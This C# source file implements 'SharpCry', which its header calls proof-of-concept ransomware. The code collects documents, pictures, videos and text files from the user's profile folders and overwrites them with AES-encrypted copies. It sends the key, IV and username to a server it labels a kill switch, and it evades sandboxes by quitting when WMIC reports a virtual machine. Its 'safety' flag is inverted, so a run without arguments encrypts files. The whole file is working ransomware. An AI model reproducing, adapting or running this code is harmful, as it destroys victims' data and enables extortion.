using System;                           // General
using System.Net;                       // HTTP Client Handle   : Kill Switch
using System.Net.Http;                  // HTTP Client Handle   : Kill Switch
using System.IO;                        // File Handle          : Read & Write Files
using System.Security.Cryptography;     // Encryption Handle    : Encrypt Files
using System.Text;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Linq;

/*
PoC (Proof of Concept) Ransomware - SharpCry
SharpCry is a PoC (Proof of Concept) ransomware that
encrypts documents, videos, pictures, downloaded files, commonly used files, and other crucial files
using the Advanced Encryption Standard (AES) mechanism.
*/

namespace SharpCry
{
    class Program
    {
        public static string __USER_DIRECT = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);      // User Directory   C:/Users/%username%
        public static string[] __TARGET_PATH = new string[] {
            Path.Combine(__USER_DIRECT, "Desktop"),                                                                 // User Desktop     C:/Users/%username%/Desktop
            Path.Combine(__USER_DIRECT, "Documents"),                                                               // User Documents   C:/Users/%username%/Documents
            Path.Combine(__USER_DIRECT, "Downloads"),                                                               // User Downloads   C:/Users/%username%/Downloads
            Path.Combine(__USER_DIRECT, "Pictures"),                                                                // User Pictures    C:/Users/%username%/Pictures
            Path.Combine(__USER_DIRECT, "Videos"),                                                                  // User Videos      C:/Users/%username%/Videos
        };
        public static string[] __FILES = new string[] {};
        public static string[] __EXTEN = new string[]
        {
            "PDF",          // PDF  Document
            "HWP",          // HWP  Document
            "MP3",          // MP3  Audio
            "MP4",          // MP4  Video
            "PNG",          // PNG  Picture
            "JPG",          // JPG  Picture
            "JPEG",         // JPEG Picture
            "TXT",          // TXT  Text
            "LOG",          // LOG  Text
        };
        public static byte[] __AES_KEY = new byte[16];
        public static byte[] __AES_IV = new byte[16];
        public static CipherMode __AES_CIPHER_MODE = CipherMode.CBC;
        public static PaddingMode __AES_PAD_MODE = PaddingMode.PKCS7;
        public static int __AES_BLOCK_SIZE = 128;
        public static int __AES_FEEDBACK_SIZE = 128;
        public static int __AES_KEY_SIZE = 128;
        public static string __DATA_ENC_CHECKSUM = "382E6121F0DA9EF6C419D69E92806481CE1EC1264809BCCC0E297DBECB495F03";
        public static string __DATA_DEC_CHECKSUM = "53484152504352595F5645524946595F53595354454D";
        public static string __KILL_SWITCH = "http://localhost:8080";
        public static bool __SAFETY = true;


        // Entry Point
        private static int Main(string[] args)
        {
            StreamWriter __HIDER = new StreamWriter(Stream.Null);
            if (args.Length != 0 && !args.Contains("--debug")) { Console.SetOut(__HIDER); }
            if (args.Length != 0 && !args.Contains("--force")) { __SAFETY = false; }
            

            Console.WriteLine($"[DEBUG] [ Main ] !!!EXECUTED!!!");

            if (IsBadAES()) { Environment.Exit(0x414553); }                     // AES encryption is not valid.
            if (IsVM()) { Environment.Exit(0x564D); }                           // Virtual machine is on running.
            if (IsKillSwitch().Result) { Environment.Exit(0x4B494C4C); }        // Kill switch is on running.

            /* [ KEY GENERATION ] */

            Aes KEY_IV_GEN = Aes.Create();
            KEY_IV_GEN.GenerateKey();
            KEY_IV_GEN.GenerateIV();

            __AES_KEY = KEY_IV_GEN.Key;
            __AES_IV = KEY_IV_GEN.IV;

            Console.WriteLine($"[DEBUG] [ Main ] AES Key: {ToHexString(__AES_KEY)}");
            Console.WriteLine($"[DEBUG] [ Main ] AES IV: {ToHexString(__AES_IV)}");
            SendAES(ToHexString(__AES_KEY), ToHexString(__AES_IV), ExecuteCommand("whoami").Replace("\\", "@")).Wait();

            /* [ PAYLOAD ] */

            Console.WriteLine($"[DEBUG] [ Main ] !!!PAYLOAD ACTIVATED!!!");
            foreach(string path in __TARGET_PATH)
            {
                string[] FILES = GetFiles(path);
                Console.Write($"[DEBUG] [ Main ] Loading... \"{path}\"\tFiles: ");
                foreach(string file in FILES) {
                    string extension = Path.GetExtension(file).TrimStart('.').ToUpper(); ;
                    if (!__EXTEN.Contains(extension)) { continue; }
                    if (!File.Exists(file)) { continue; }

                    // Resize Array + Add Element
                    int currentLength = __FILES.Length;
                    string[] newArray = new string[currentLength + 1];
                    Array.Copy(__FILES, newArray, currentLength);
                    newArray[currentLength] = file;
                    __FILES = newArray;
                }
                Console.WriteLine($"{FILES.Length}");
            }

            /* [ ENCRYPT FILES ] */

            Console.Write($"[DEBUG] [ Main ] Encrypting files... PERMISSION: ");
            ConsoleColor orginColor = Console.ForegroundColor;
            if (__SAFETY == true) {
                Console.ForegroundColor =ConsoleColor.Green;
                Console.WriteLine("GRANTED");
                Console.ForegroundColor = orginColor; }
            else {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("DENIED");
                Console.ForegroundColor = orginColor;
                Console.WriteLine($"[DEBUG] [ Main ] SAFETY IS ACTIVE. TURN IT OFF BY USING --force OPTION.");
            }
            foreach (string FILE in __FILES)
            {
                byte[] __DATA = File.ReadAllBytes(FILE);
                byte[] __ENC_DATA = Encrypt(__AES_KEY, __AES_IV, __DATA);
                byte[] __DEC_DATA = Decrypt(__AES_KEY, __AES_IV, __ENC_DATA);
                if (__DATA == __DEC_DATA) { Console.WriteLine($"[DEBUG] [ Main ] AES checksum failed."); continue; }
                if (__SAFETY == true) {
                    Console.WriteLine($"[DEBUG] [ Main ] \"{FILE}\"");
                    File.WriteAllBytes(FILE, __ENC_DATA);
                }
            }

            Console.WriteLine("[DEBUG] [ Main ] Complete.");

            return 0;                                                           // Success
        }

        private static byte[] Encrypt(byte[] AES_KEY, byte[] AES_IV, byte[] DATA)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Mode = __AES_CIPHER_MODE;
                aes.Padding = __AES_PAD_MODE;
                aes.BlockSize = __AES_BLOCK_SIZE;
                aes.FeedbackSize = __AES_FEEDBACK_SIZE;
                aes.KeySize = __AES_KEY_SIZE;
                aes.Key = AES_KEY;
                aes.IV = AES_IV;

                using (ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    {
                        cs.Write(DATA, 0, DATA.Length);
                    }
                    return ms.ToArray();
                }
            }
        }

        private static byte[] Decrypt(byte[] AES_KEY, byte[] AES_IV, byte[] DATA)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Mode = __AES_CIPHER_MODE;
                aes.Padding = __AES_PAD_MODE;
                aes.BlockSize = __AES_BLOCK_SIZE;
                aes.FeedbackSize = __AES_FEEDBACK_SIZE;
                aes.KeySize = __AES_KEY_SIZE;
                aes.Key = AES_KEY;
                aes.IV = AES_IV;

                using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                using (MemoryStream ms = new MemoryStream(DATA))
                using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                using (MemoryStream output = new MemoryStream())
                {
                    cs.CopyTo(output);
                    return output.ToArray();
                }
            }
        }

        private static bool IsBadAES()
        {
            string __EX_DATA = "SHARPCRY_VERIFY_SYSTEM";                                                            // Hard coded verification string.
            byte[] __BYTE_DATA = Encoding.ASCII.GetBytes(__EX_DATA);                                                // Get bytes from the string.
            byte[] __DATA_ENC = Encrypt(__AES_KEY, __AES_IV, __BYTE_DATA);                                          // Check AES encryption validity.
            byte[] __DATA_DEC = Decrypt(__AES_KEY, __AES_IV, __DATA_ENC);                                           // Check AES decryption validity.
            Console.WriteLine($"[DEBUG] [ IsBadAES() ] Original Data: [{__EX_DATA}]");
            Console.WriteLine($"[DEBUG] [ IsBadAES() ] Original Byte Data: [{ToHexString(__BYTE_DATA)}]");
            Console.WriteLine($"[DEBUG] [ IsBadAES() ] Encrypted Data (Hex): [{ToHexString(__DATA_ENC)}]");
            Console.WriteLine($"[DEBUG] [ IsBadAES() ] Decrypted Data (Hex): [{ToHexString(__DATA_DEC)}]");
            Console.WriteLine($"[DEBUG] [ IsBadAES() ] Result: [{Encoding.ASCII.GetString(__DATA_DEC)}]");
            if (__EX_DATA != Encoding.ASCII.GetString(__DATA_DEC)) { return true; }         // Decryption fail:         Unsecure validity.
            else if (ToHexString(__DATA_ENC) != __DATA_ENC_CHECKSUM) { return true; }       // Encryption not match:    Possible DLL hooking
            else if (ToHexString(__DATA_DEC) != __DATA_DEC_CHECKSUM) { return true; }       // Decryption not match:    Possible DLL hooking
            return false;                                                                   // Success:                 No issues
        }

        public static bool IsVM()
        {
            // Check BIOS information using WMIC
            string biosInfo = ExecuteCommand("wmic bios get manufacturer");
            if (biosInfo.Contains("VMware") ||
                biosInfo.Contains("VirtualBox") ||
                biosInfo.Contains("QEMU") ||
                biosInfo.Contains("Microsoft Corporation"))
            {
                Console.WriteLine("[DEBUG] [ IsVM ] Detected VM from BIOS info.");
                return true;
            }
            Console.WriteLine("[DEBUG] [ IsVM ] No VM info from: BIOS ");

            // Check System Manufacturer using WMIC
            string systemInfo = ExecuteCommand("wmic computersystem get manufacturer");
            if (systemInfo.Contains("VMware") ||
                systemInfo.Contains("VirtualBox") ||
                systemInfo.Contains("QEMU") ||
                systemInfo.Contains("Microsoft Corporation"))
            {
                Console.WriteLine("[DEBUG] [ IsVM ] Detected VM from System Manufacturer.");
                return true;
            }
            Console.WriteLine("[DEBUG] [ IsVM ] No VM info from: System Manufacturer");

            // Check System Model using WMIC
            string systemModel = ExecuteCommand("wmic computersystem get model");
            if (systemModel.Contains("Virtual") ||
                systemModel.Contains("VMware") ||
                systemModel.Contains("VirtualBox"))
            {
                Console.WriteLine("[DEBUG] [ IsVM ] Detected VM from System Model.");
                return true;
            }
            Console.WriteLine("[DEBUG] [ IsVM ] No VM info from: System Model");

            return false;
        }

        private static async Task<bool> IsKillSwitch()
        {
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    client.Timeout = TimeSpan.FromSeconds(3);
                    HttpResponseMessage response = await client.GetAsync(__KILL_SWITCH);

                    if (response.IsSuccessStatusCode) { Console.WriteLine($"[DEBUG] [ IsKillSwitch() ] Kill switch is NOT active."); return false; }
                    else { return true; }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[DEBUG] [ IsKillSwitch() ] Kill switch is active.");
                    return true;
                }
            }
        }

        private static async Task SendAES(string __AES_KEY_HEX, string __AES_IV_HEX, string __USER)
        {
            using (HttpClient client = new HttpClient())
            {
                client.Timeout = TimeSpan.FromSeconds(3);
                HttpResponseMessage response = await client.GetAsync($"{__KILL_SWITCH}?KEY={__AES_KEY_HEX}&IV={__AES_IV_HEX}&USER={__USER}");

                if (response.IsSuccessStatusCode) { Console.WriteLine($"[DEBUG] [ SendAES() ] AES key & iv has been sent to: {__KILL_SWITCH}"); }
            }
        }

        private static string ExecuteCommand(string command)
        {
            using (var process = new Process())
            {
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = $"/c {command}";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                return output;
            }
        }

        private static string[] GetFiles(string path)
        {
            return Directory.GetFiles(path);
        }

        private static string ToHexString(byte[] data) { return BitConverter.ToString(data).Replace("-", ""); }     // Convert hex to string. (TypeConverter)
    }
}